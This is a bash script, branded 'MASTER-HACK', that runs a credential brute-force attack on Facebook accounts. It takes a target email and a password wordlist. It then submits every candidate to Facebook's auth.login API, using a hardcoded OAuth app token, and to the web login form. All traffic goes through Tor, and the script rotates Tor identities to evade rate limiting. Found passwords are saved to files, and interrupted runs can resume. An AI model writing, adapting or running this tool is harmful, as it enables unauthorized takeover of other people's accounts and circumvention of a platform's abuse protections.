#!/bin/bash
apt install figlet -y
apt install ruby -y 
apt install php -y 
gem install lolcat 
clear
printf " \033[0;33m  whatsapp me : +916235369260 for any doubts "
echo ""
echo ""
figlet MASTER-HACK |lolcat
echo " https://github.com/DRACULA-HACK/"
trap 'store; exit 1;' 2
counter=0
counter2=20
start=0
end=20
turn=$((start+end))
startline=1
endline=1
sumstart=0


checkroot() {
if [[ "$(id -u)" -ne 0 ]]; then
    printf "\e[1;77mPlease run me as root!\n\e[0m"
    exit 1
fi
}

checktor() {

check=$(curl --socks5-hostname localhost:9050 -s https://www.google.com > /dev/null; echo $?)

if [[ "$check" -gt 0 ]]; then
printf "\033[0;35m Please, check your TOR Connection Just type \"tor\" or \"service tor start to start tor server \"\n\e[0m"
exit 1
fi

}


dependencies() {

command -v tor > /dev/null 2>&1 || { echo >&2 " install tor tor is not insa"; exit 1; }
command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not installed, run requirements.sh Aborting."; exit 1; }

}


banner() {


printf "\n"
printf "\033[1;36m	 created by Master-hack \e[0m\n"
printf "\033[0;33m  MASTER FACEBOOK HACK     \e[0m\n"
printf "\n"

}
USER_AGENT='Firefox'

function start() {

read -p $'\033[0;34m account gmail : \e[0m' EMAIL
default_wl_pass="passwords.lst"
read -p $'\033[1;36m\Wordlist ( Enter to use default wordlist): \e[0m' wl_pass
wl_pass="${wl_pass:-${default_wl_pass}}"

}
function changeip() {

killall -HUP tor

}

function store() {

if [[ -n "$PASS" ]]; then
printf "\e[1;91m [#] Waiting a second...\n\e[0m"
sleep 3
fi
default_session="Y"
printf "\n\e[1;77mSave session for user\e[0m\e[1;92m %s \e[0m" $EMAIL
read -p $'\e[1;77m? [Y/n]: \e[0m' session
session="${session:-${default_session}}"
if [[ "$session" == "Y" || "$session" == "y" || "$session" == "yes" || "$session" == "Yes" ]]; then
if [[ ! -d sessions ]]; then
mkdir sessions
fi
cum=$(grep -n "$PASS" "$wl_pass" | cut -d ":" -f1)
printf "EMAIL=\"%s\"\nPASS=\"%s\"\nwl_pass=\"%s\"\ncum=\"%s\"\ntoken=\"%s\"\n" $EMAIL $PASS $wl_pass $token $token > sessions/store.session.$EMAIL.$(date +"%FT%H%M")
printf "\e[1;77mSession saved.\e[0m\n"
printf "\e[1;92mUse ./fb.brutforcemaster.sh.save.sh --resume\n"
else
exit 1
fi

}


function bruteforcer() {

C_Pass=$(wc -l $wl_pass | cut -d " " -f1)
printf "\e[1;92mEmail account:\e[0m\e[1;77m %s\e[0m\n" $EMAIL
printf "\e[1;92mWordlist:\e[0m\e[1;77m %s (%s)\e[0m\n" $wl_pass $C_Pass
printf "\e[1;91m[#] Press Ctrl + C to stop or save session\n\e[0m"
}


function method1() {

while [ $counter -lt $turn ]; do

IFS=$'\n'
for PASS in $(sed -n ''$((startline+sumstart))','$endline'p' $wl_pass); do
cpass=$(grep -n "$PASS" "$wl_pass" | cut -d ":" -f1)
token=$(($counter+1))
printf "\e[1;77mTrying pass (%s/%s)\e[0m: \"%s\"\n" $token $C_Pass $PASS
sleep 1
{( trap '' SIGINT && check=$( curl --socks5 localhost:9050 -s 'https://b-api.facebook.com/method/auth.login' --user-agent "Firefox" -L -H "Authorization: OAuth 200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16" -d "email=$EMAIL&password=$PASS" | grep -o "session_key\|account is temporarily unavailable" | uniq ); if [[ $check == "session_key" ]]; then printf "\e[1;92m \n  [#] Password Found: %s\n " $PASS; printf "Username: %s, Password: %s\n" $EMAIL $PASS >> cracked.password ; printf "\e[1;92m [#] Saved:\e[0m\e[1;77m cracked.passwordcracked.password  \n\e[0m";  kill -1 $$ ; elif [[ $check == "account is temporarily unavailable" ]]; then printf "\e[1;92m \n [#] Password Found or false positive: %s\n [#] Flag can be false positive\n" $PASS; printf "Username: %s, Password: %s\n" $EMAIL $PASS >> found.fbruter ; printf "\e[1;92m [#] Saved:\e[0m\e[1;77m password cracked \n\e[0m";  kill -1 $$ ;  fi ) } & done; wait $!;
let counter++
let startline++
let endline++
changeip
done

}


function method2() {

rm -rf cookies*
while [ $counter2 -lt $turn ]; do

IFS=$'\n'
for PASS in $(sed -n ''$((startline+sumstart))','$endline'p' $wl_pass); do
cpass=$(grep -n "$PASS" "$wl_pass" | cut -d ":" -f1)
token=$(($counter2+1))
COOKIES='cookies'$cpass''
#printf "method 2 \n"
printf "\e[1;77mTrying pass (%s/%s)\e[0m: %s\n" $token $C_Pass $PASS

{( trap '' SIGINT && curl -s -X GET --socks5-hostname localhost:9050 'https://www.facebook.com/home.php' --user-agent $USER_AGENT --cookie $COOKIES --cookie-jar $COOKIES --location > /dev/null && curl -s -X POST --socks5-hostname localhost:9050 'https://login.facebook.com/login.php'  --user-agent $USER_AGENT --data-urlencode "email=${EMAIL}" --data-urlencode "pass=${PASS}" --cookie $COOKIES --cookie-jar $COOKIES > /dev/null && var=$( curl -s -X GET --socks5-hostname localhost:9050 'https://www.facebook.com/home.php'  --user-agent $USER_AGENT --cookie $COOKIES --cookie-jar $COOKIES | grep -o "logoutMenu\|account is temporarily unavailable" | uniq ); if [[ $var == "logoutMenu" ]]; then printf "\e[1;92m \n [#] Password Found: %s\n " $PASS; printf "Username: %s, Password: %s\n" $EMAIL $PASS >> cracked.password ; printf "\e[1;92m [#] Saved:\e[0m\e[1;77m found.fbruter \n\e[0m";  kill -1 $$ ; elif [[ $check == "account is temporarily unavailable" ]]; then printf "\e[1;92m \n [#] Password Found or false positive: %s\n [#] Flag can be false positive\n" $PASS; printf "Username: %s, Password: %s\n" $EMAIL $PASS >> found.fbruter ; printf "\e[1;92m [#] Saved:\e[0m\e[1;77m found.fbruter \n\e[0m";  kill -1 $$ ; fi; ) } & done; wait $!;
rm -rf cookies$cpass
changeip
let startline++
let endline++
let counter2++

done
}

function resumemethod1() {
counter1=1
C_Pass=$(wc -l $wl_pass | cut -d " " -f1)
while [ $counter1 -lt $turn ]; do
threads=1
IFS=$'\n'
for PASS in $(sed -n ''$token','$(($cum+1))'p' $wl_pass); do

#cpass=$(grep -n "$PASS" "$wl_pass" | cut -d ":" -f1)
#childcount=$(($counter1))
printf "\e[1;77mTrying pass (%s/%s)\e[0m: %s\n" $token $C_Pass $PASS
let token++
#sleep 1
{( trap '' SIGINT && check=$( curl --socks5 localhost:9050 -s 'https://b-api.facebook.com/method/auth.login' --user-agent "Firefox" -L -H "Authorization: OAuth 200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16" -d "email=$EMAIL&password=$PASS" | grep -o "session_key\|account is temporarily unavailable" | uniq ); if [[ $check == "session_key" ]]; then printf "\e[1;92m \n  [#] Password Found: %s\n " $PASS; printf "Username: %s, Password: %s\n" $EMAIL $PASS >> cracked.password ; printf "\e[1;92m [#] Saved:\e[0m\e[1;77m cracked the password  \n\e[0m";  kill -1 $$ ; elif [[ $check == "account is temporarily unavailable" ]]; then printf "\e[1;92m \n [#] Password Found or false positive: %s\n [#] Flag can be false positive\n" $PASS; printf "Username: %s, Password: %s\n" $EMAIL $PASS >> found.fbruter ; printf "\e[1;92m [#] Saved:\e[0m\e[1;77m found.fbruter \n\e[0m";  kill -1 $$ ; fi ) } & done; wait $!;
let counter1++
let threads++
let startline++
let endline++
#let cpass++
let cum++
changeip
done

}

function resumemethod2() {
rm -rf cookies*
C_Pass=$(wc -l $wl_pass | cut -d " " -f1)
counter22=20
while [ $counter22 -lt $turn ]; do

IFS=$'\n'
for PASS in $(sed -n ''$token','$(($cum+1))'p' $wl_pass); do
let cpass++

COOKIES='cookies'$cpass''
#echo "method 2: \n"
#childcount=$(($counter22))
printf "\e[1;77mTrying pass (%s/%s)\e[0m: %s\n" $token $C_Pass $PASS

{( trap '' SIGINT && curl -s -X GET --socks5-hostname localhost:9050 'https://www.facebook.com/home.php' --user-agent $USER_AGENT --cookie $COOKIES --cookie-jar $COOKIES --location > /dev/null && curl -s -X POST --socks5-hostname localhost:9050 'https://login.facebook.com/login.php'  --user-agent $USER_AGENT --data-urlencode "email=${EMAIL}" --data-urlencode "pass=${PASS}" --cookie $COOKIES --cookie-jar $COOKIES > /dev/null && var=$( curl -s -X GET --socks5-hostname localhost:9050 'https://www.facebook.com/home.php'  --user-agent $USER_AGENT --cookie $COOKIES --cookie-jar $COOKIES | grep -o "logoutMenu\|account is  unavailable" | uniq ); if [[ $var == "logoutMenu" ]]; then printf "\e[1;92m \n [#] Password Found: %s\n " $PASS; printf "Username: %s, Password: %s\n" $EMAIL $PASS >> cracked.password ; printf "\e[1;92m [#] Saved:\e[0m\e[1;77m found.fbruter \n\e[0m";  kill -1 $$ ; elif [[ $check == "account is  unavailable" ]]; then printf "\e[1;92m \n [#] Password Found or false positive: %s\n [#] Flag can be false positive\n" $PASS; printf "Username: %s, Password: %s\n" $EMAIL $PASS >> found.fbruter ; printf "\e[1;92m [#] Saved:\e[0m\e[1;77m found.fbruter \n\e[0m";  kill -1 $$ ; fi; ) } & done; wait $!;
rm -rf cookies$cpass
changeip

let startline++
let endline++
let counter22++
let token++
let cum++
done
}

function resume() {

banner
# tor test
checktor
counter=1
if [[ ! -d sessions ]]; then
printf "\e[1;91m[#] No sessions\n\e[0m"
exit 1
fi
printf "\e[1;92mFiles sessions:\n\e[0m"
for list in $(ls sessions/store.session*); do
IFS=$'\n'
source $list
printf "\e[1;92m%s \e[0m\e[1;77m: %s (\e[0m\e[1;92mwl:\e[0m\e[1;77m %s\e[0m\e[1;92m,\e[0m\e[1;92m lastpass:\e[0m\e[1;77m %s )\n\e[0m" "$counter" "$list" "$wl_pass" "$PASS"
let counter++
done
read -p $'\e[1;92mChoose a session number: \e[0m' fileresume
source $(ls sessions/store.session* | sed ''$fileresume'q;d')

printf "\e[1;92m[#] Resuming session for user:\e[0m \e[1;77m%s\e[0m\n" $user
printf "\e[1;92m[#] Wordlist: \e[0m \e[1;77m%s\e[0m\n" $wl_pass
printf "\e[1;91m[#] Press Ctrl + C to stop or save session\n\e[0m"

while [ true ]; do

resumemethod1
#let turn+=20
#method2
hourdate=$(date +%H)
dat=$(($hourdate + 1))
mindate=$(date +%M:%S)
printf "\e[1;91m[#] Wait for same seconds to return :\e[0m\e[1;93m %s:%s\n\e[0m" $dat $mindate
let turn+=20
sleep 20
resumemethod2
hourdate2=$(date +%H)
dat2=$(($hourdate2 + 1))
mindate2=$(date +%M:%S)
printf "\e[1;91m[#] Wait for same seconds to return :\e[0m\e[1;93m %s:%s\n\e[0m" $dat2 $mindate2
let turn+=20
sleep 3600
done

}

case "$1" in --resume) resume ;; *)

banner
#checkroot
dependencies
checktor
start
bruteforcer
while [ true ]; do

method1
#let turn+=20
#method2
hourdate=$(date +%H)
dat=$(($hourdate + 1))
mindate=$(date +%M:%S)
printf "\e[1;91m[#] Wait for same seconds to return :\e[0m\e[1;93m %s:%s\n\e[0m" $dat $mindate
let turn+=20
sleep 3600
method2
hourdate2=$(date +%H)
dat2=$(($hourdate2 + 1))
mindate2=$(date +%M:%S)
printf "\e[1;91m[#] Wait for same seconds to return :\e[0m\e[1;93m %s:%s\n\e[0m" $dat2 $mindate2
let turn+=20
sleep 3600
done

esac
